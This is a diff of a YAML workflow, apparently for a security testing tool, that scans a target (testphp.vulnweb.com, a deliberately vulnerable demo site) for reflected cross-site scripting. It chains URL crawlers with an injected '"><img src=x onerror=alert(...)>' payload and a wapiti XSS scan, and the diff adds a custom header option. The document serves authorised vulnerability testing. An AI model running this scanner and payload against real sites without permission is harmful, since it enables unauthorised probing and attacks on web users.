@@ -1,22 +1,23 @@
 description: Conducts a security test to identify Cross-Site Scripting (XSS) vulnerabilities. It starts by using 'gau' to fetch URLs from the specified target, excluding common image file extensions to focus on potentially vulnerable endpoints. The script then filters for URLs containing query parameters and replaces these parameters with a test XSS payload. 'Httpx' is employed to request these modified URLs, looking specifically for responses with a 200 status code that include the payload's unique identifier, indicating a successful XSS injection. This approach helps in pinpointing URLs susceptible to XSS attacks, thereby aiding in the identification and mitigation of these security vulnerabilities.
 tags: xss, XSS
-params: target=testphp.vulnweb.com
+params: target=testphp.vulnweb.com, header="Example:Blackdagger"
+# Change header without blank if you need or add authorization
 env:
   - HOME: /root/
   - LOG_DIR: ${HOME}/logs
   - PATH: /usr/local/bin:${PATH}
 steps:
-  - name: CustomXSS-Internal
+  - name: CustomXSS-External
     command: bash
     script: |
       gau ${target//\"} | grep -Ev "\.(jpeg|jpg|png|ico)$" | grep =  | qsreplace "\"><img src=x onerror=alert(12345654321)>" | ~/go/bin/httpx -silent -mc 200 -mr "<img\s+src=x\s+onerror=alert\(12345654321\)>"
 
-  - name: CustomXSS-External
+  - name: CustomXSS-Internal
     command: bash
     script: |
-      ~/go/bin/httpx -u $target | katana qurl | qsreplace "\"><img src=x onerror=alert(12345654321)>" | ~/go/bin/httpx -silent -mc 200 -mr "<img\s+src=x\s+onerror=alert\(12345654321\)>"
+      ~/go/bin/httpx -u $target | katana -H "$header" qurl | qsreplace "\"><img src=x onerror=alert(12345654321)>" | ~/go/bin/httpx -silent -mc 200 -mr "<img\s+src=x\s+onerror=alert\(12345654321\)>"
 
   - name: AutoXSS
     command: bash
     script: |
-      wapiti -m xss -u http://${target//\"}
+      ~/go/bin/httpx -u $target -o resXSS_${target//\"}.txt ; wapiti -u "$(cat resXSS_${target//\"}.txt)" -m xss -H "$header"
